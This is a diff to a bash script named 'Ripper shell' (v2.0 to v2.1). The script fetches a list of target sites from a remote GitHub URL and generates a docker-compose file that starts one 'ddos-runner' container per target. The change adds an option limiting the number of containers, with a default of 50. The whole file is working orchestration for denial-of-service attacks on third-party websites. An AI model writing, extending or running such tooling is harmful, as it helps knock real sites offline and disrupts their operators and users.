@@ -1,12 +1,16 @@
 #!/bin/bash
-# Ripper shell v2.0
+# Ripper shell v2.1
+# 1.0 - initial script (uses local urls.txt file)
+# 2.0 - added external mirror for url list
+# 2.1 - added possibility to limit number of containers (for less powerful machines like 13in mbp pre M1)
 
-VERSION='2.0'
+VERSION='2.1'
 TARGETS_URL='https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'
 
 function print_help {
   echo -e "Usage: os_x_ripper.sh --mode install"
   echo -e "--mode|-m - runmode (install, reinstall, start, stop)"
+  echo -e "--number|-n - number of containers to start"
 }
 
 function print_version {
@@ -28,9 +32,15 @@ function check_params {
 }
 
 function generate_compose {
+    if [ -z ${amount} ]; then
+        echo -e "Amount of containers not set, setting to maximum of 50"
+        amount=50
+    fi
+
     echo -e "version: '3'" > docker-compose.yml
     echo -e "services:" >> docker-compose.yml
     counter=1
+
     while read -r site_url; do
         if [ ! -z $site_url ]; then
             echo -e "  ddos-runner-$counter:" >> docker-compose.yml
@@ -62,6 +72,10 @@ while test -n "$1"; do
     MODE=$2
     shift
     ;;
+  --number|-n)
+      amount=$2
+      shift
+      ;;
   *)
     echo "Unknown argument: $1"
     print_help
